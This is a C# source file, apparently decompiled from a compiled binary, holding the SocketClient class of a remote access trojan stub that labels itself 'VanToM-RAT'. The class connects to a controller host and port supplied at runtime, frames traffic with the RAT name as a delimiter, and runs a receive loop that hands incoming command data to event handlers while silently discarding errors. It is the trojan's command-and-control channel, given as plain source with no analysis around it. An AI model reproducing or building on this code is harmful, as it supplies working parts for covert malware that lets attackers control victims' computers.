using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000008 RID: 8
	public class SocketClient
	{
		// Token: 0x06000022 RID: 34 RVA: 0x00002730 File Offset: 0x00000930
		public SocketClient()
		{
			SocketClient.__ENCAddToList(this);
			this.IsBuzy = false;
			this.SPL = "VanToM-RAT";
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002754 File Offset: 0x00000954
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = SocketClient.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = SocketClient.__ENCList.Count == SocketClient.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = SocketClient.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = SocketClient.__ENCList[num4];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num4 != num;
								if (flag2)
								{
									SocketClient.__ENCList[num] = SocketClient.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						SocketClient.__ENCList.RemoveRange(num, SocketClient.__ENCList.Count - num);
						SocketClient.__ENCList.Capacity = SocketClient.__ENCList.Count;
					}
					SocketClient.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000024 RID: 36 RVA: 0x00002868 File Offset: 0x00000A68
		// (remove) Token: 0x06000025 RID: 37 RVA: 0x00002884 File Offset: 0x00000A84
		[method: DebuggerNonUserCode]
		public event SocketClient.ConnectedEventHandler Connected;

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x06000026 RID: 38 RVA: 0x000028A0 File Offset: 0x00000AA0
		// (remove) Token: 0x06000027 RID: 39 RVA: 0x000028BC File Offset: 0x00000ABC
		[method: DebuggerNonUserCode]
		public event SocketClient.DisconnectedEventHandler Disconnected;

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x06000028 RID: 40 RVA: 0x000028D8 File Offset: 0x00000AD8
		// (remove) Token: 0x06000029 RID: 41 RVA: 0x000028F4 File Offset: 0x00000AF4
		[method: DebuggerNonUserCode]
		public event SocketClient.DataEventHandler Data;

		// Token: 0x0600002A RID: 42 RVA: 0x00002910 File Offset: 0x00000B10
		public bool Statconnected()
		{
			bool result;
			try
			{
				bool connected = this.C.Client.Connected;
				if (connected)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002974 File Offset: 0x00000B74
		public void Connect(string h, int p)
		{
			try
			{
				try
				{
					bool flag = this.C != null;
					if (flag)
					{
						this.C.Close();
						this.C = null;
					}
				}
				catch (Exception ex)
				{
				}
				while (this.IsBuzy)
				{
					Thread.Sleep(1);
				}
				try
				{
					this.C = new TcpClient();
					this.C.Connect(h, p);
					Thread thread = new Thread(new ThreadStart(this.RC), 10);
					thread.Start();
					SocketClient.ConnectedEventHandler connectedEvent = this.ConnectedEvent;
					bool flag = connectedEvent != null;
					if (flag)
					{
						connectedEvent();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			catch (Exception ex3)
			{
				SocketClient.DisconnectedEventHandler disconnectedEvent = this.DisconnectedEvent;
				bool flag = disconnectedEvent != null;
				if (flag)
				{
					disconnectedEvent();
				}
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002AA8 File Offset: 0x00000CA8
		public void DisConnect()
		{
			try
			{
				this.C.Close();
			}
			catch (Exception ex)
			{
			}
			this.C = null;
			SocketClient.DisconnectedEventHandler disconnectedEvent = this.DisconnectedEvent;
			bool flag = disconnectedEvent != null;
			if (flag)
			{
				disconnectedEvent();
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002B10 File Offset: 0x00000D10
		public void Send(string s)
		{
			this.Send(Module1.SB(s));
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002B24 File Offset: 0x00000D24
		public void Send(byte[] b)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(b, 0, b.Length);
				memoryStream.Write(Module1.SB(this.SPL), 0, this.SPL.Length);
				this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
			catch (Exception ex)
			{
				this.DisConnect();
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002BB4 File Offset: 0x00000DB4
		private void RC()
		{
			this.IsBuzy = true;
			MemoryStream memoryStream = new MemoryStream();
			int num = 0;
			checked
			{
				for (;;)
				{
					Thread.Sleep(1);
					try
					{
						bool flag = this.C == null;
						if (flag)
						{
							break;
						}
						flag = !this.C.Client.Connected;
						if (flag)
						{
							break;
						}
						num++;
						flag = (num > 100);
						if (flag)
						{
							num = 0;
							try
							{
								flag = (this.C.Client.Poll(-1, SelectMode.SelectRead) & this.C.Client.Available <= 0);
								if (flag)
								{
									break;
								}
							}
							catch (Exception ex)
							{
								break;
							}
						}
						flag = (this.C.Available > 0);
						if (flag)
						{
							byte[] array = new byte[this.C.Available - 1 + 1];
							this.C.Client.Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, array.Length);
							for (;;)
							{
								flag = Module1.BS(memoryStream.ToArray()).Contains(this.SPL);
								if (!flag)
								{
									break;
								}
								Array array2 = Module1.fx(memoryStream.ToArray(), this.SPL);
								SocketClient.DataEventHandler dataEvent = this.DataEvent;
								flag = (dataEvent != null);
								if (flag)
								{
									dataEvent((byte[])NewLateBinding.LateIndexGet(array2, new object[]
									{
										0
									}, null));
								}
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
								flag = (array2.Length == 2);
								if (!flag)
								{
									break;
								}
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet(array2, new object[]
								{
									1
								}, null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array2, new object[]
								{
									1
								}, null), null, "length", new object[0], null, null, null)));
								Thread.Sleep(1);
							}
						}
					}
					catch (Exception ex2)
					{
						break;
					}
				}
				this.IsBuzy = false;
				this.DisConnect();
			}
		}

		// Token: 0x0400000B RID: 11
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400000C RID: 12
		private TcpClient C;

		// Token: 0x04000010 RID: 16
		private bool IsBuzy;

		// Token: 0x04000011 RID: 17
		private string SPL;

		// Token: 0x02000009 RID: 9
		// (Invoke) Token: 0x06000033 RID: 51
		public delegate void ConnectedEventHandler();

		// Token: 0x0200000A RID: 10
		// (Invoke) Token: 0x06000037 RID: 55
		public delegate void DisconnectedEventHandler();

		// Token: 0x0200000B RID: 11
		// (Invoke) Token: 0x0600003B RID: 59
		public delegate void DataEventHandler(byte[] b);
	}
}
